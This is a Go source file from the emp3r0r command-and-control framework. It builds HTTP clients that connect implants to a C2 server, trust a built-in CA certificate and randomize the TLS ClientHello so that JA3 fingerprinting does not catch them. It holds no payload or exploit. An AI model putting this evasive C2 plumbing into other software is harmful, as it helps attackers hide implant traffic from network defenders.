package transport

import (
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	utls "github.com/refraction-networking/utls"
)

// CreateEmp3r0rHTTPClient add our CA to trusted CAs, while keeps TLS InsecureVerify on
// c2_addr: C2 address, only the hostname will be used
// proxyServer: proxy server URL, if empty, direct connection will be used
func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
	// Extract CA bundle from built-in certs
	rootCAs, err := ExtractCABundle(CACrtPEM)
	if err != nil {
		logging.Fatalf("ExtractCABundle: %v", err)
	}

	// C2 URL
	addr := c2_addr
	if !strings.HasPrefix(addr, "http") {
		addr = "https://" + addr
	}
	c2url, err := url.Parse(addr)
	if err != nil {
		logging.Fatalf("Error parsing C2 address '%s': %v", addr, err)
	}

	// add our cert
	if ok := rootCAs.AppendCertsFromPEM(CACrtPEM); !ok {
		logging.Fatalf("No CA certs appended")
	}

	// Trust the augmented cert pool in our TLS client
	c2_host := c2url.Hostname()
	config := &utls.Config{
		ServerName:         c2_host,
		InsecureSkipVerify: false,
		RootCAs:            rootCAs,
	}

	// fingerprint of CA
	ca_crt, _ := ParsePem(CACrtPEM)
	logging.Printf("CA cert fingerprint: %s, now making proxy dialer", sha256SumRaw(ca_crt.Raw))

	// set proxyURL to nil to use direct connection for C2 transport
	proxyDialer, _ := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
	if proxyServer != "" {
		logging.Printf("Using proxy server: %s", proxyServer)
		// use a proxy for our HTTP client
		proxyUrl, e := url.Parse(proxyServer)
		if e != nil {
			logging.Fatalf("Invalid proxy: %v", e)
		}

		proxyDialer, _ = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
	}

	// transport of our http client, with configured TLS client
	try := 0
init_transport:
	logging.Printf("Initializing transport (%s)...", c2url)
	tr, err := makeTransport(c2url, clientHelloIDMap["hellorandomizedalpn"], config, proxyDialer)
	try++
	if err != nil {
		if proxyServer != "" && try < 5 {
			logging.Printf("Proxy server (%s) down, retrying (%d)...", proxyServer, try)
			util.TakeASnap(false)
			goto init_transport
		} else {
			logging.Printf("Error initializing transport (%s): makeRoundTripper: %v", c2url, err)
			return nil
		}
	}

	logging.Printf("Transport initialized (%s)", c2url)
	return &http.Client{Transport: tr}
}

// CreatePreflightHTTPClient creates a lightweight HTTP client for preflight checks
// Only adds C2's CA cert and uses utls with random JA3 fingerprint
// This is suitable for preflight checks where we want minimal overhead
func CreatePreflightHTTPClient(c2_addr string) *http.Client {
	// C2 URL
	addr := c2_addr
	if !strings.HasPrefix(addr, "http") {
		addr = "https://" + addr
	}
	c2url, err := url.Parse(addr)
	if err != nil {
		logging.Printf("Error parsing C2 address '%s': %v", addr, err)
		return nil
	}

	// Create a cert pool with only C2's CA cert
	rootCAs, err := ExtractCABundle(CACrtPEM)
	if err != nil {
		logging.Printf("ExtractCABundle: %v", err)
		return nil
	}

	// Trust only C2's CA cert in our TLS client
	c2_host := c2url.Hostname()
	config := &utls.Config{
		ServerName:         c2_host,
		InsecureSkipVerify: false,
		RootCAs:            rootCAs,
	}

	// Use NewUTLSRoundTripper with random ALPN fingerprint for preflight
	// This avoids the heavy initialization and retry logic in CreateEmp3r0rHTTPClient
	rt, err := NewUTLSRoundTripper("hellorandomizedalpn", config, nil)
	if err != nil {
		logging.Printf("Error creating uTLS round tripper: %v", err)
		return nil
	}

	return &http.Client{
		Transport: rt,
		Timeout:   30 * time.Second,
	}
}
